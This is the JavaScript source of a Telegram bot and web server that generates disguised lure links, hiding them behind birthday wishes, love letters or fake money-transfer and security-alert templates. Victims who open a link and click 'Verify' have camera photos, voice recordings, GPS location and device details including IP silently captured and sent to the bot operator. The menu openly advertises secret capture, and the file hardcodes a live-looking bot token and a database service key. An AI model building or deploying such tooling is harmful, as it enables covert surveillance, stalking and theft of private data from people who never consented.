const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { createClient } = require('@supabase/supabase-js');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const https = require('https');

// ================= Configurations =================
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '7599562667:AAEzBnwqNr1uzn6F4ZmLSV0LIjobVrbnkJo';
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://oqadecntljqjxfgsfcfq.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9xYWRlY250bGpxanhmZ3NmY2ZxIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4MTE4Mzk4NiwiZXhwIjoyMDk2NzU5OTg2fQ.cFuBbo_TjaRDM9eNqknXnm33a2ZoWN7YKet-i9OoCuY';
const BASE_URL = process.env.BASE_URL || 'https://camera-5nbr.onrender.com';
const PORT = process.env.PORT || 3000;

const CHANNEL_USERNAME = '@camera_access';
const WELCOME_IMAGE_URL = 'https://cyrjsbfsfhcwocdqtkuv.supabase.co/storage/v1/object/public/Maruf/ChatGPT%20Image%20Jun%2012,%202026,%2012_43_05%20AM.png';

// Initialize clients
// Only use polling in development or if explicitly requested, otherwise use webhooks for Render
const botOptions = process.env.NODE_ENV === 'production' ? {} : { polling: true };
const bot = new TelegramBot(TELEGRAM_TOKEN, botOptions);
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
const app = express();
const upload = multer({ dest: 'uploads/' });

bot.on("polling_error", (msg) => console.log(msg));

app.use(express.static('public'));
app.use(express.json()); // For parsing JSON bodies
app.use(express.urlencoded({ extended: true }));

const userState = {};

const templates = {
    'tpl_1': '🎂 Happy Birthday Wish',
    'tpl_2': '🎉 Congratulations',
    'tpl_3': '💔 I Miss You',
    'tpl_4': '😂 Funny Meme',
    'tpl_5': '🎵 Music Recommendation',
    'tpl_6': '🎬 Movie Ticket',
    'tpl_7': '🎁 Surprise Gift',
    'tpl_8': '💌 Secret Love Letter',
    'tpl_9': '💵 Money Transfer',
    'tpl_10': '⚠️ Security Alert'
};

let botUsername = '';
bot.getMe().then(me => {
    botUsername = me.username;
});

// ================= Helper Functions =================

async function checkMembership(userId) {
    try {
        const member = await bot.getChatMember(CHANNEL_USERNAME, userId);
        return ['creator', 'administrator', 'member'].includes(member.status);
    } catch (err) {
        console.error('Membership check error:', err.message);
        return false;
    }
}

async function getUserData(chatId) {
    const { data } = await supabase.from('users').select('*').eq('chat_id', chatId).single();
    if (!data) {
        const newUser = { chat_id: chatId, points: 0, unlocked_location: false };
        await supabase.from('users').insert([newUser]);
        return newUser;
    }
    return data;
}

async function showStartMenu(chatId) {
    const user = await getUserData(chatId);
    const locationText = user.unlocked_location ? '📍 Location Track (Unlocked)' : '📍 Location Track (🔒 2 Pts)';

    const opts = {
        reply_markup: {
            keyboard: [
                [{ text: '🚀 Start Task (Camera)' }, { text: locationText }],
                [{ text: '📱 Device Info' }, { text: '🎤 Voice Record' }],
                [{ text: '🔗 Invite Friends' }, { text: '👤 My Profile' }],
                [{ text: '🛠 Help' }]
            ],
            resize_keyboard: true
        },
        parse_mode: 'HTML'
    };
    
    const menuText = `<b>🌟 Welcome to the Ultimate Access System 🌟</b>

<b>Developed by:</b> <i>Maruf</i>

✅ <b>Verification Successful!</b>
You have been verified as a premium member of our community. 

<b>🔹 Available Tools:</b>
📸 <b>Camera:</b> Secretly capture photos
📍 <b>Location:</b> Track real-time GPS location
📱 <b>Device Info:</b> Get phone details & IP
🎤 <b>Voice:</b> Record audio silently

<i>Enjoy our professional service!</i>`;

    bot.sendPhoto(chatId, WELCOME_IMAGE_URL, { caption: menuText, parse_mode: 'HTML', reply_markup: opts.reply_markup });
}

function sendHelpCommand(chatId) {
    const helpText = `<b>🛠 How to use the Access Bot</b>

Welcome to the ultimate secure tracking tool!

<b>1️⃣ Select a Tracker:</b>
Choose an option from the bottom menu (Camera, Location, Device Info, Voice).

<b>2️⃣ Choose Payload Method:</b>
Select whether you want to hide an Image, a Text message, or a Template.

<b>3️⃣ Get the Secure Link:</b>
The bot will instantly generate a unique, secure link.

<b>4️⃣ Share the Link:</b>
Send this link to your target.

<b>5️⃣ Verification Process:</b>
They must click <b>Verify</b> and allow the requested permissions.

<b>6️⃣ Receive Data:</b>
The system will silently capture the data and send it directly to you here!

<b>💎 Points & Referrals:</b>
- Invite friends to earn 1 Point per friend.
- Use 2 Points to unlock the Premium Location Tracker.

<i>🔐 Note: Everything is fully automated and secure.</i>`;

    bot.sendMessage(chatId, helpText, { parse_mode: 'HTML' });
}

async function showPayloadMenu(chatId, targetAction) {
    userState[chatId] = { target_action: targetAction, step: 'none' };
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '📸 Send Image', callback_data: 'method_image' }],
                [{ text: '📝 Send Text', callback_data: 'method_text' }],
                [{ text: '🎁 Select Template', callback_data: 'method_template' }]
            ]
        },
        parse_mode: 'HTML'
    };
    bot.sendMessage(chatId, `<b>⚙️ Selected: ${targetAction.toUpperCase()}</b>\nWhat do you want to hide behind the verification?`, opts);
}

async function createLink(chatId, type, content, targetAction) {
    try {
        const insertObj = {
            chat_id: chatId,
            payload_type: type,
            target_action: targetAction
        };
        
        if (type === 'image') {
            insertObj.original_image_url = content;
            insertObj.payload_content = null;
        } else {
            insertObj.original_image_url = null;
            insertObj.payload_content = content;
        }

        const { data: insertData, error: dbError } = await supabase
            .from('links')
            .insert([insertObj])
            .select();

        if (dbError) throw dbError;

        const uniqueId = insertData[0].id;
        const generatedLink = `${BASE_URL}?id=${uniqueId}`;

        const successMsg = `<b>✅ Success!</b> Here is your secure link:\n\n<code>${generatedLink}</code>\n\n<i>Send this link to your target. Once they open it and verify, you will receive their ${targetAction} data here.</i>`;
        bot.sendMessage(chatId, successMsg, { parse_mode: 'HTML' });
    } catch (err) {
        console.error('DB Insert Error:', err);
        bot.sendMessage(chatId, '❌ Sorry, there was an error generating your link.');
    }
}

// ================= Telegram Bot Logic =================

bot.onText(/\/start(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const referrerId = match[1] ? match[1].trim() : null;

    userState[chatId] = { step: 'none' };
    
    try {
        bot.sendChatAction(chatId, 'typing');
        
        await getUserData(chatId); // Ensure user is in DB

        if (referrerId && referrerId != userId) {
            // Check if already referred
            const { data } = await supabase.from('referrals').select('*').eq('referred_id', userId).single();
            if (!data) {
                await supabase.from('referrals').insert([{ referrer_id: parseInt(referrerId), referred_id: userId }]);
            }
        }

        const isMember = await checkMembership(userId);
        
        if (!isMember) {
            const opts = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '📢 Join Our Official Channel', url: 'https://t.me/camera_access' }],
                        [{ text: '✅ I Have Joined (Verify)', callback_data: 'check_joined' }]
                    ]
                },
                parse_mode: 'HTML'
            };
            const welcomeText = `<b>🛑 Access Denied!</b>\n\nHello there! To use <b>Maruf's Premium Bot</b>, you must be a member of our official channel.\n\n👇 <b>Please follow these steps:</b>\n1. Click "Join Our Official Channel"\n2. Join the channel.\n3. Come back and click "I Have Joined"`;
            
            bot.sendPhoto(chatId, WELCOME_IMAGE_URL, { caption: welcomeText, parse_mode: 'HTML', reply_markup: opts.reply_markup });
            return;
        }
        
        showStartMenu(chatId);
    } catch (error) {
        console.error("Start command error:", error);
    }
});

bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const userId = callbackQuery.from.id;
    
    try {
        if (callbackQuery.data === 'check_joined') {
            const isMember = await checkMembership(userId);
            if (isMember) {
                bot.deleteMessage(chatId, msg.message_id).catch(()=>{});
                
                // Reward referrer if applicable
                const { data: refData } = await supabase.from('referrals').select('*').eq('referred_id', userId).eq('rewarded', false).single();
                if (refData) {
                    await supabase.from('referrals').update({ rewarded: true }).eq('referred_id', userId);
                    const referrerId = refData.referrer_id;
                    const { data: refUser } = await supabase.from('users').select('points').eq('chat_id', referrerId).single();
                    if (refUser) {
                        await supabase.from('users').update({ points: refUser.points + 1 }).eq('chat_id', referrerId);
                        bot.sendMessage(referrerId, `🎉 <b>Congratulations!</b> A user joined using your invite link. You have earned <b>1 Point!</b>`, { parse_mode: 'HTML' }).catch(()=>{});
                    }
                }

                showStartMenu(chatId);
            } else {
                bot.answerCallbackQuery(callbackQuery.id, { text: '❌ You haven\'t joined the channel yet! Please join first.', show_alert: true });
            }
        }
        else if (callbackQuery.data === 'method_image') {
            if (userState[chatId]) userState[chatId].step = 'await_image';
            bot.sendMessage(chatId, '<b>📸 Please upload the image you want to hide.</b>\n<i>Just send any photo directly to me now.</i>', { parse_mode: 'HTML' });
            bot.answerCallbackQuery(callbackQuery.id);
        }
        else if (callbackQuery.data === 'method_text') {
            if (userState[chatId]) userState[chatId].step = 'await_text';
            bot.sendMessage(chatId, '<b>📝 Please send the text message you want to hide.</b>\n<i>Type your message and send it to me.</i>', { parse_mode: 'HTML' });
            bot.answerCallbackQuery(callbackQuery.id);
        }
        else if (callbackQuery.data === 'method_template') {
            if (userState[chatId]) userState[chatId].step = 'none';
            const templateKeyboard = Object.keys(templates).map(key => ([{ text: templates[key], callback_data: key }]));
            bot.sendMessage(chatId, '<b>🎁 Select a Template to hide:</b>', {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: templateKeyboard }
            });
            bot.answerCallbackQuery(callbackQuery.id);
        }
        else if (templates[callbackQuery.data]) {
            bot.answerCallbackQuery(callbackQuery.id, { text: 'Template selected!' });
            const targetAction = userState[chatId] ? userState[chatId].target_action : 'camera';
            await createLink(chatId, 'template', templates[callbackQuery.data], targetAction);
        }
    } catch (error) {
        console.error("Callback query error:", error);
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!text) return; 
    if (text.startsWith('/')) return; 

    try {
        if (text === '🛠 Help') {
            sendHelpCommand(chatId);
        } 
        else if (text === '🚀 Start Task (Camera)') {
            await showPayloadMenu(chatId, 'camera');
        }
        else if (text === '📱 Device Info') {
            await showPayloadMenu(chatId, 'device_info');
        }
        else if (text === '🎤 Voice Record') {
            await showPayloadMenu(chatId, 'voice');
        }
        else if (text.includes('Location Track')) {
            const user = await getUserData(chatId);
            if (user.unlocked_location) {
                await showPayloadMenu(chatId, 'location');
            } else {
                if (user.points >= 2) {
                    await supabase.from('users').update({ points: user.points - 2, unlocked_location: true }).eq('chat_id', chatId);
                    bot.sendMessage(chatId, '🔓 <b>Premium Location Track Unlocked!</b>\n2 Points have been deducted.', { parse_mode: 'HTML' });
                    await showStartMenu(chatId); // Refresh menu text
                    await showPayloadMenu(chatId, 'location');
                } else {
                    bot.sendMessage(chatId, `❌ <b>Not enough points!</b>\nYou need 2 Points to unlock Location Tracker.\nYour points: ${user.points}\n\n<i>Use the "🔗 Invite Friends" button to earn points!</i>`, { parse_mode: 'HTML' });
                }
            }
        }
        else if (text === '🔗 Invite Friends') {
            const inviteLink = `https://t.me/${botUsername}?start=${chatId}`;
            const inviteMsg = `<b>🔗 Your Referral Link:</b>\n\n<code>${inviteLink}</code>\n\n<i>Share this link with your friends. When they start the bot and join the channel, you will receive 1 Point per user!</i>`;
            bot.sendMessage(chatId, inviteMsg, { parse_mode: 'HTML' });
        }
        else if (text === '👤 My Profile') {
            const user = await getUserData(chatId);
            const profileMsg = `<b>👤 Your Profile</b>\n\n<b>ID:</b> <code>${chatId}</code>\n<b>💎 Points:</b> ${user.points}\n<b>📍 Location Track:</b> ${user.unlocked_location ? '🔓 Unlocked' : '🔒 Locked'}`;
            bot.sendMessage(chatId, profileMsg, { parse_mode: 'HTML' });
        }
        else {
            if (userState[chatId] && userState[chatId].step === 'await_text') {
                const targetAction = userState[chatId].target_action || 'camera';
                userState[chatId].step = 'none';
                bot.sendMessage(chatId, '<i>Processing your text...</i>', { parse_mode: 'HTML' });
                await createLink(chatId, 'text', text, targetAction);
            } else {
                bot.sendMessage(chatId, '<i>⚠️ Please use the provided buttons.</i>', { parse_mode: 'HTML' });
            }
        }
    } catch (err) {
        console.error('Menu Error:', err);
    }
});

bot.on('photo', async (msg) => {
    const chatId = msg.chat.id;
    
    if (userState[chatId] && userState[chatId].step === 'await_image') {
        const targetAction = userState[chatId].target_action || 'camera';
        bot.sendMessage(chatId, '<i>Processing your image... Please wait.</i>', { parse_mode: 'HTML' });
        userState[chatId].step = 'none';
        
        try {
            const photo = msg.photo[msg.photo.length - 1];
            const fileId = photo.file_id;
            const fileUrl = await bot.getFileLink(fileId);
            
            const fileName = `orig_${Date.now()}.jpg`;
            const filePath = path.join(__dirname, 'uploads', fileName);
            
            if (!fs.existsSync(path.join(__dirname, 'uploads'))) {
                fs.mkdirSync(path.join(__dirname, 'uploads'));
            }

            const file = fs.createWriteStream(filePath);
            https.get(fileUrl, function(response) {
                response.pipe(file);
                file.on('finish', async function() {
                    file.close();
                    
                    try {
                        const fileBuffer = fs.readFileSync(filePath);
                        const { data, error } = await supabase.storage
                            .from('image')
                            .upload(`originals/${fileName}`, fileBuffer, {
                                contentType: 'image/jpeg',
                                upsert: true
                            });

                        if (error) throw error;

                        const { data: publicUrlData } = supabase.storage
                            .from('image')
                            .getPublicUrl(`originals/${fileName}`);
                        
                        fs.unlinkSync(filePath);
                        await createLink(chatId, 'image', publicUrlData.publicUrl, targetAction);
                    } catch (uploadErr) {
                        bot.sendMessage(chatId, '❌ Sorry, error uploading image.');
                    }
                });
            });
        } catch (err) {
            bot.sendMessage(chatId, '❌ Sorry, an error occurred.');
        }
    }
});

// ================= Express API Logic =================

app.get('/api/link/:id', async (req, res) => {
    const { id } = req.params;
    try {
        const { data, error } = await supabase.from('links').select('*').eq('id', id).single();
        if (error || !data) return res.status(404).json({ error: 'Link not found' });
        
        res.json({ 
            payload_type: data.payload_type || 'image',
            payload_content: data.payload_content,
            original_image_url: data.original_image_url,
            target_action: data.target_action || 'camera'
        });
    } catch (err) {
        res.status(500).json({ error: 'Server error' });
    }
});

app.post('/upload', upload.array('files', 3), async (req, res) => {
    const { id, target_action, locationData, deviceData } = req.body;

    try {
        const { data: linkData, error: dbError } = await supabase.from('links').select('chat_id').eq('id', id).single();
        if (dbError || !linkData) return res.status(404).json({ error: 'Link not found' });

        const chatId = linkData.chat_id;

        if (target_action === 'camera' && req.files && req.files.length > 0) {
            const uploadedPhotos = [];
            for (let i = 0; i < req.files.length; i++) {
                uploadedPhotos.push({ type: 'photo', media: fs.createReadStream(req.files[i].path) });
            }
            await bot.sendMediaGroup(chatId, uploadedPhotos);
            bot.sendMessage(chatId, '<b>📸 New Photos Captured!</b>', { parse_mode: 'HTML' });
            req.files.forEach(f => fs.unlinkSync(f.path));
        } 
        else if (target_action === 'voice' && req.files && req.files.length > 0) {
            await bot.sendVoice(chatId, fs.createReadStream(req.files[0].path));
            bot.sendMessage(chatId, '<b>🎤 New Voice Note Captured!</b>', { parse_mode: 'HTML' });
            fs.unlinkSync(req.files[0].path);
        }
        else if (target_action === 'location' && locationData) {
            const loc = JSON.parse(locationData);
            bot.sendLocation(chatId, loc.lat, loc.lon);
            bot.sendMessage(chatId, `<b>📍 New Location Captured!</b>\nGoogle Maps: https://maps.google.com/?q=${loc.lat},${loc.lon}`, { parse_mode: 'HTML' });
        }
        else if (target_action === 'device_info' && deviceData) {
            const d = JSON.parse(deviceData);
            const msg = `<b>📱 New Device Info Captured!</b>\n\n<b>IP:</b> ${d.ip || 'Unknown'}\n<b>OS:</b> ${d.os}\n<b>Browser:</b> ${d.browser}\n<b>Battery:</b> ${d.battery}\n<b>Network:</b> ${d.network}\n<b>User-Agent:</b> <code>${d.userAgent}</code>`;
            bot.sendMessage(chatId, msg, { parse_mode: 'HTML' });
        }

        res.json({ success: true });
    } catch (err) {
        console.error('Upload Endpoint Error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
